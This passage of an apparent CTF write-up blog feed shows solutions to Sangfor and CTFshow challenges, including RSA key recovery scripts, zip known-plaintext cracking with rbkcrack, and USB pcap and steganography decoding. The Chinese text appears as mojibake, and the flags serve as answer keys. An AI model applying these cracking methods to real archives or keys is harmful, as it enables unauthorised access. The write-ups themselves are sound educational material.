class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line">c = <span class="built_in">pow</span>(c, e, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = %d&quot;</span> % c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output</span></span><br><span class="line"><span class="comment"># c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>å°è¯•å‘ç° $\gcd(n_1,n_2)=p$ï¼Œåˆ†åˆ«æ±‚å‡º $q_1=n_1/p,q_2=n_2/p$ï¼Œå†ç”¨å¸¸è§„è§£å¯†æ–¹æ³•ä¸¤æ­¥æ±‚å‡º $m$ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line"></span><br><span class="line">p = gmpy2.gcd(n1,n2)</span><br><span class="line">q1 = n1 // p</span><br><span class="line">q2 = n2 // p</span><br><span class="line">d1 = gmpy2.invert(e, (p-<span class="number">1</span>)*(q1-<span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e, (p-<span class="number">1</span>)*(q2-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(c, d2, n2)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d1, n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;SangFor&#123;qSccmm1WrgvIg2Uq_cZhmqNfEGTz2GV8&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h3><blockquote><p>ç®€ç®€å•å•çŒœæ•°å­—01-30 SangFor{md5(<strong>-</strong>-<strong>-</strong>â€¦..)}ï¼ˆ32ä½md5ï¼‰</p></blockquote><p>12å¼ å›¾åˆ†åˆ«å¾—åˆ°å…³é”®æ•°å­—ï¼š28-08-30-07-04-20-02-17-23-01-12-19ï¼Œmd5å¾—flagï¼šSangFor{d93b7da38d89c19f481e710ef1b3558b}</p><p>â€‹    </p><h3 id="Misc520"><a href="#Misc520" class="headerlink" title="Misc520"></a>Misc520</h3><blockquote><p>æœ‰ä¸€å¤©ï¼Œzipçˆ±ä¸Šäº†pcapï¼Œzipä¸ºäº†èƒ½ä¸pcapåˆ›é€ æ›´å¤šæœºä¼šï¼Œä¸æ–­åœ°å°†è‡ªå·±çš„èƒ½åŠ›è¡¨ç°å‡ºæ¥ã€‚å¯æ˜¯ï¼ŒLSBStegå´çªç„¶æ€äº†å‡ºæ¥ï¼Œå°†pcapåå¹¶äºpngä¸­ï¼Œä¸æ”¾å‡ºæ¥ã€‚zipçœ‹åˆ°äº†pngï¼Œå¤šå–çƒ­æ°´å°‘åšæ¢¦ã€‚zipå¼‚å¸¸çš„æ„¤æ€’ï¼Œä¸æ–­åœ°ç”¨è‡ªå·±çš„èƒ½åŠ›å»æŠ¥å¤pngï¼Œä¸è®©pngé€ƒèµ°ã€‚è‡³ä»Šï¼Œzipä»æœªé‡Šæ€€ã€‚ã€‚ã€‚</p></blockquote><p>æ‹¿åˆ°520.zipå‹ç¼©åŒ…ï¼Œå¾ªç¯åµŒå¥—ç€520å±‚zipå’Œstoryæ–‡ä»¶ï¼Œè„šæœ¬è§£å‹å‡ºæ‰€æœ‰æ–‡ä»¶ï¼ˆæ¯æ¬¡è§£å‹å°†storyæ–‡ä»¶é‡å‘½åé˜²è¦†ç›–ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">now = <span class="string">&quot;520.zip&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;~~&quot;</span>+now)</span><br><span class="line">    zfile = zipfile.ZipFile(now)</span><br><span class="line">    zfile.extractall(members=zfile.namelist())</span><br><span class="line">    zfile.close()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.remove(now)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    names = os.listdir()</span><br><span class="line">    os.rename(<span class="string">&#x27;story&#x27;</span>,<span class="string">&#x27;story&#x27;</span>+now.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(names)</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        <span class="keyword">if</span> name.endswith(<span class="string">&#x27;.zip&#x27;</span>) <span class="keyword">and</span> name != now:</span><br><span class="line">            now=name</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;~~~~&#x27;</span>+now)</span><br></pre></td></tr></table></figure><p>è§£å‡ºæœ€é‡Œå±‚æ˜¯ä¸€å¼ flag.pngå›¾ç‰‡ï¼ŒæŒ‰å¤§å°æ’åºç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼Œå‘ç°story150å†…å®¹ä¸å…¶ä»–ä¸åŒï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¿™éƒ½è¢«ä½ å‘ç°äº†ï¼Ÿ</span><br><span class="line">æˆ‘è¿™æ•…äº‹ä¸é”™å§ï¼Œå˜»å˜»å˜»</span><br><span class="line">é‚£å°±æŠŠflagç»™ä½ å§</span><br><span class="line">ohï¼Œä¸ï¼Œè¿˜æœ‰ä¸€åŠè—åœ¨äº†pcapçš„å¿ƒé‡Œï¼Œå¿«å»æ‰¾æ‰¾å§</span><br><span class="line">å·¦å¿ƒæˆ¿å³å¿ƒæˆ¿ï¼Œæ‰‘é€šæ‰‘é€šçš„å¿ƒï¼Œå’¿å‘€å’¿å‘€çš„â¤</span><br><span class="line">72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108,</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æ•°å­— <code>72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108,</code></p><p>æ ¹æ®æç¤ºï¼ŒzstegæŸ¥çœ‹pngå›¾ç‰‡å­˜åœ¨lsbéšå†™ï¼ŒæŒ‰bgræ–¹å¼æå–å‡ºä¸€ä¸ªzipåŠ å¯†å‹ç¼©åŒ…ï¼Œçˆ†ç ´å¾—å¯†ç <code>12345</code>è§£å‡ºflag.pcapã€‚</p><p>wiresharkæŸ¥çœ‹å‘ç°å…¨ä¸ºUSBæµé‡ï¼Œtsharkæå–ï¼š</p><p><code>tshark -r flag.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p><p>å°†é¼ æ ‡æ•°æ®è¿˜åŸé¼ æ ‡ç§»åŠ¨è½¨è¿¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">a=f.readline().strip()</span><br><span class="line"><span class="keyword">if</span> a:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">8</span>:</span><br><span class="line">out=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">fi.write(out)</span><br><span class="line">fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">fi.close()</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;xy.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">12</span> :</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">x = <span class="built_in">int</span>(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">y = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">x -= <span class="number">256</span></span><br><span class="line"><span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">y -= <span class="number">256</span></span><br><span class="line">posx += x</span><br><span class="line">posy += y</span><br><span class="line">btn_flag = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">    f.write(<span class="built_in">str</span>(posx))</span><br><span class="line">    f.write(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>(posy))</span><br><span class="line">    f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>æœ€ågnuplotåšå›¾ï¼š</p><p><code>gnuplot&gt; plot &quot;xy.txt&quot;</code></p><p>å¾—åˆ°ååŠéƒ¨åˆ†æ•°å­—ï¼š<code>130, 63, 111, 94, 51, 134, 119, 146</code></p><p>ç»“åˆflagæ ¼å¼ï¼Œæ¨çŸ¥ä¸ºå˜å¼‚å‡¯æ’’ç§»ä½è§£å¯†ï¼Œè§£å‡ºï¼š</p><p><code>[71, 87, 72, 84, 123, 87, 51, 108, 67, 111, 109, 51, 95, 116, 48, 95, 77, 33, 115, 99, 125]</code></p><p>å³<code>GWHT&#123;W3lCom3_t0_M!sc&#125;</code>ï¼ŒæŒ‰ç¾¤æç¤ºæ¢ä¸º<code>Sangfor&#123;W3lCom3_t0_M!sc&#125;</code>ã€‚</p><p>â€‹    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;å¤§èµ›ç”±ä¸­å…±å¹¿å·å¸‚å§”ç½‘ç»œå®‰å…¨å’Œä¿¡æ¯åŒ–å§”å‘˜ä¼šåŠå…¬å®¤ä½œä¸ºæŒ‡å¯¼å•ä½ï¼Œå¹¿å·å¸‚ç½‘ç»œå®‰å…¨äº§ä¸šä¿ƒè¿›ä¼šä¸»åŠï¼Œå¹¿ä¸œå¤–è¯­å¤–è´¸å¤§å­¦ã€æ·±ä¿¡æœç§‘æŠ€è‚¡ä»½æœ‰é™å…¬å¸æ‰¿åŠï¼Œå¹¿å·å¸‚ä¿¡æ¯å®‰å…¨æµ‹è¯„ä¸­å¿ƒã€å¹¿å·äº’è”ç½‘åä¼šååŠã€‚&lt;/p&gt;
&lt;p&gt;å¤§èµ›ä»¥â€œç½‘ç»œå®‰å…¨ä¸ºäººæ°‘ã€ç½‘ç»œå®‰å…¨é äººæ°‘â€ä¸ºä¸»é¢˜ï¼Œæ—¨åœ¨</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021èµ›" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow åƒç“œæ¯</title>
    <link href="https://lazzzaro.github.io/2021/08/16/match-CTFshow-%E5%90%83%E7%93%9C%E6%9D%AF/"/>
    <id>https://lazzzaro.github.io/2021/08/16/match-CTFshow-%E5%90%83%E7%93%9C%E6%9D%AF/</id>
    <published>2021-08-16T11:22:00.000Z</published>
    <updated>2021-08-16T12:32:10.014Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>æ¯”èµ›åç§°ï¼šctfshow åƒç“œæ¯<br>é¢˜ç›®èŒƒå›´ï¼šweb pwn re misc crypto<br>é¢˜ç›®éš¾åº¦ï¼šæ€ä¹ˆç®€å•æ€ä¹ˆæ¥<br>æ¯”èµ›å¥–åŠ±ï¼šctfshowå®šåˆ¶é¼ æ ‡å«æˆ–èŒå¦¹æ‰‹åŠ<br>æ¯”èµ›æ—¶é—´ï¼š2021å¹´8æœˆ14æ—¥(å‘¨å…­) æ™š 7ç‚¹7åˆ†<br>æ¯”èµ›æ—¶é•¿ï¼š48å°æ—¶<br>æ¯”èµ›åœ°å€ï¼š<a href="https://ctf.show/challenges">https://ctf.show/challenges</a></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Miscæ¸¸æˆç­¾åˆ°"><a href="#Miscæ¸¸æˆç­¾åˆ°" class="headerlink" title="Miscæ¸¸æˆç­¾åˆ°"></a>Miscæ¸¸æˆç­¾åˆ°</h3><blockquote><p>è¿æ°”ä¸<del>ç­–ç•¥</del>è¿æ°”çš„æ¸¸æˆã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç¬¬ä¸€å±€å‡ºç°å¿…è¾“çš„æƒ…å†µæ˜¯æ­£å¸¸çš„ï¼Œå¹¶ä¸”æ¦‚ç‡è¾ƒä½ï¼Œè¿™èƒ½è¡¨æ˜æ‚¨åœ¨ä¸ƒå¤•è¿™ä¸ªèŠ‚æ—¥çœŸçš„éå¸¸æ¬§ï¼Œè¿™è¾¹å»ºè®®å»æŠ½å¡ã€‚<del>æ‰€ä»¥è¯´æœ¬é¢˜æ²¡æœ‰ç­–ç•¥ï¼Œåªæœ‰è¿æ°”ã€‚</del></p><p>åœ°å€ï¼š ç§»æ­¥å»å¤‡ç”¨é¢˜,flagå°±åœ¨è¿™äº¤</p></blockquote><p>è¿æ°”æ¸¸æˆï¼Œå†™ä¸ªå¾ªç¯è„šæœ¬è·‘å‡ºåˆ†æ®µflagã€‚</p><p>â€‹    </p><h3 id="Dinner-of-Cyanogen"><a href="#Dinner-of-Cyanogen" class="headerlink" title="Dinner of Cyanogen"></a>Dinner of Cyanogen</h3><p>ç»™äº†ä¸¤ä¸ªdocxï¼Œä¸€ä¸ªæœªåŠ å¯†ï¼Œå¦ä¸€ä¸ªåŠ å¯†ã€‚</p><p>åœ¨æœªåŠ å¯†docxå¾—åˆ°flagç¬¬ä¸€æ®µï¼›</p><p>å‘ç°å…¶ä¸­çš„ <code>[Content_Types].xml</code> å¤§å°ç›¸åŒï¼Œä¸Šæ˜æ–‡æ”»å‡»ï¼š</p><p><code>rbkcrack.exe -C AnotherLetter.zip -c &quot;[Content_Types].xml&quot; -p &quot;[Content_Types].xml&quot;</code></p><p>å¾—åˆ°3-keyï¼Œå†ç”¨7zå·¥å…·è§£å‹ï¼š</p><p><code>7za x AnotherLetter.zip &#39;-p[3b982977_2706fd64_6d6a5135]&#39; -oout</code></p><p>åœ¨ <code>flag.xml</code> å¾—åˆ°flagç¬¬äºŒæ®µï¼›</p><p>åœ¨ <code>word.xml</code> åˆ†åˆ«ç”¨0/1ä»£æ›¿Wingdingsä¸¤ç§å­—ä½“ï¼Œè½¬å­—ç¬¦ä¸²å¾—åˆ°flagç¬¬ä¸‰æ®µã€‚</p><p>â€‹    </p><h3 id="xlçš„æœ¬è´¨"><a href="#xlçš„æœ¬è´¨" class="headerlink" title="xlçš„æœ¬è´¨"></a>xlçš„æœ¬è´¨</h3><p>Excel 2007ï¼ˆ.xlsxï¼‰æ–‡ä»¶æœ¬è´¨æ˜¯å‹ç¼©åŒ…ã€‚</p><p>æ–°å»ºä¸€ä¸ªexcelï¼Œæ’å…¥ç»˜å›¾ï¼Œä¿å­˜é€€å‡ºã€‚</p><p>æ›¿æ¢å…¶ä¸­ xl/drawing ç›®å½•ä¸‹çš„ drawing.xml ä¸ºé¢˜ç›®ç»™çš„xmlæ–‡ä»¶ï¼Œå†æ‰“å¼€xlsxæ–‡ä»¶çœ‹åˆ°flagå›¾ç‰‡ã€‚</p><p>â€‹    </p><h3 id="åƒç“œ"><a href="#åƒç“œ" class="headerlink" title="åƒç“œ"></a>åƒç“œ</h3><p>jpgæ”¹ä¸ºzipè§£å‹ï¼Œæ–‡ä»¶ä¸ºbase64å›¾ç‰‡ï¼Œæµè§ˆå™¨æ‰“å¼€å¾—åˆ°äºŒç»´ç ï¼Œæ‰«ç å¾—æ …æ å¯†ç ï¼Œæšä¸¾æ æ•°ï¼ˆæ æ•°=2ï¼‰è§£å¯†å¾—flagã€‚</p><p>â€‹    </p><h3 id="é­”ç‹"><a href="#é­”ç‹" class="headerlink" title="é­”ç‹"></a>é­”ç‹</h3><blockquote><p><strong>éœ€è¦è‡ªå·±åŒ…ä¸Šctfshow{}</strong></p><p>é¢˜ç›®æœ‰å¾ˆå¤šè¯¯å¯¼ï¼Œå°å¿ƒç‚¹å“¦</p></blockquote><p>w3xä¸ºé­”å…½äº‰éœ¸åœ°å›¾æ–‡ä»¶ï¼Œç›´æ¥æ‰¾åˆ°åœ°å›¾æŸ¥çœ‹å·¥å…· War3 Model Editorï¼Œæ‰¾åˆ°flagå­—ç¬¦ä¸²ã€‚</p><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="é—ªç”µäº”è¿é­Â·ä¸€é­"><a href="#é—ªç”µäº”è¿é­Â·ä¸€é­" class="headerlink" title="é—ªç”µäº”è¿é­Â·ä¸€é­"></a>é—ªç”µäº”è¿é­Â·ä¸€é­</h3><blockquote><p>æœ‹å‹ä»¬å¥½ã€‚</p><p>ä»Šå¤©ï¼Œå’Œå¤§å®¶ï¼Œæ¢è®¨ä¸€ä¸‹ï¼Œæ€æ ·æ‰“RSAç½®æ¢é—ªç”µé­ã€‚</p><p>è¦åšåˆ°ä¸‰ç‚¹ã€‚</p><p>ä¸€ï¼šè¦åšåˆ°é—®é¢˜çœŸæ­£çš„æ”¾æ¾ã€‚ä½†æ˜¯çº¿æ€§ä»£æ•°åŸºæœ¬çŸ¥è¯†è¦ç”¨å¥½ã€‚è¿™é‡Œé¢ï¼Œè¯¥æ¾çš„æ¾ï¼Œè¯¥ç´§çš„ç´§ã€‚æ¾ä¸­æœ‰ç´§ï¼Œç´§ä¸­æœ‰æ¾ã€‚è¿™ä¸ªé—®é¢˜éå¸¸å¤æ‚ï¼Œåœ¨è¿™é‡Œä¸å¤šè¯´ã€‚åœ¨é—®é¢˜çš„æè¿°ä¸­æœ‰è¯¦ç»†çš„è§£é‡Šï¼›</p><p>äºŒï¼šè¦ç»ƒå¥½å†…åŠŸï¼Œä½ æ‰èƒ½ä»£ç ä¸­å‘åŠ›ï¼Œæ‰“å‡ºRSAç½®æ¢åŠ²å„¿ã€‚æ…¢ç»ƒï¼Œè¿™æ˜¯ç­¾åˆ°çš„â€¦â€¦å¿«ç»ƒï¼ä¸‹åˆä¸Šå¼€ï¼Œä¸Šåˆä¸‹å¼€ï¼æ‰€ä»¥ï¼Œè¿™ä¸ªRSAç½®æ¢åŠ²å„¿å•Šâ€¦â€¦è¿™ä¸ªRSAå’Œç½®æ¢éƒ½åœ¨åŠ¨å•Šâ€¦â€¦</p><p>ä¸‰ï¼šè¦ç”¨é«˜ç»´çš„RSAç½®æ¢åŠ²å„¿ï¼Œæ‰èƒ½æ‰“å‡ºRSAç½®æ¢é—ªç”µé­ã€‚å› ä¸ºè¿™ä¸ªé­çš„åŠ²å„¿ï¼Œä½ çœ‹â€¦â€¦æ˜¯ä¸æ˜¯ï¼Œä½ çœ‹â€¦â€¦éƒ½æ˜¯é«˜ç»´çš„å•Šâ€¦â€¦</p><p>ä¸‹é¢æˆ‘æ‰“ä¸€ä¸ªè¿äº”é­å•Šâ€¦â€¦æ‰“äº†äº”é­ï¼š<strong>ä¸€é­</strong>ï¼Œä¸¤é­ï¼Œä¸‰é­ï¼Œå››é­ï¼Œäº”é­ã€‚è¿™äº”é­è¦è¿æ¬¡æ‰“ï¼Œä½ çœ‹ï¼šå®æˆ˜æ—¶é—´ï¼Œä¸€å®šè¦åŠ¨æ­¦ï¼Œå…¨èº«æ¾å¥½ï¼Œç”¨é«˜ç»´çš„åŠ²ï¼ŒRSAç½®æ¢åŠ²å„¿ï¼æ‰èƒ½æ‰“å‡ºflagï¼Œæ‰“å‡ºRSAç½®æ¢é—ªç”µé­ï¼</p><p>è°¢è°¢æœ‹å‹ä»¬ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">8870619487339789349033932217513908953609539651949986489986889710933094577873155191810742828503059670650154455297603719</span></span><br><span class="line">c = <span class="number">6940158573485767169443582872275118843545217792197971962103010557916847970940437712181778807436191892307187137338300231</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">3</span>, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="é—ªç”µäº”è¿é­Â·äºŒé­"><a href="#é—ªç”µäº”è¿é­Â·äºŒé­" class="headerlink" title="é—ªç”µäº”è¿é­Â·äºŒé­"></a>é—ªç”µäº”è¿é­Â·äºŒé­</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">random.seed(<span class="number">0x36D</span>)</span><br><span class="line">n = <span class="number">3950848271664122675439855009329233027357977239695163232943132810210035583520735079984423511153607529820284200137188647</span></span><br><span class="line"></span><br><span class="line">Zn = Zmod(n)</span><br><span class="line">P = PermutationGroupElement(<span class="string">&#x27;(1,14,25,8,23,15)(2,22,17)(3,18,13,33,11,30,26,27,10,6,16,31,28,21,29,36,7,9)(4,35,12,32,20,5,24)(19,34)&#x27;</span>)</span><br><span class="line">P = Matrix(Zn, P.matrix())</span><br><span class="line">A = Matrix(Zn, <span class="number">36</span>, <span class="number">36</span>, <span class="keyword">lambda</span> x, y: random.randint(<span class="number">0</span>, <span class="number">0x36D</span>))</span><br><span class="line">B = A * P * A^-<span class="number">1</span></span><br><span class="line">c = [...]</span><br><span class="line">C = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    C.append(c[i*<span class="number">36</span>:(i+<span class="number">1</span>)*<span class="number">36</span>])</span><br><span class="line">C = Matrix(Zn, C)</span><br><span class="line">B_inv = B^<span class="number">3</span></span><br><span class="line">C_new = C / B_inv</span><br><span class="line">cc = C_new[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">3</span>, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(cc, d, n)</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="é—ªç”µäº”è¿é­Â·ä¸‰é­"><a href="#é—ªç”µäº”è¿é­Â·ä¸‰é­" class="headerlink" title="é—ªç”µäº”è¿é­Â·ä¸‰é­"></a>é—ªç”µäº”è¿é­Â·ä¸‰é­</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BB = B^3</span></span><br><span class="line"><span class="comment"># BB_inv = BB^(-1)</span></span><br><span class="line"><span class="comment"># CC = C * BB_inv</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">25126409997644048715497037905442671105116158875704245711785280791201683049008805107543997350200944348915833337286069203</span></span><br><span class="line">cc = <span class="number">2440870830361488333405717893137622686904829095539256446436231771058787790530861000815874544642875904753470292396055730</span></span><br><span class="line">cc = (cc * gmpy2.invert(<span class="number">36</span>, n)) % n</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">3</span>, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(cc, d, n)</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 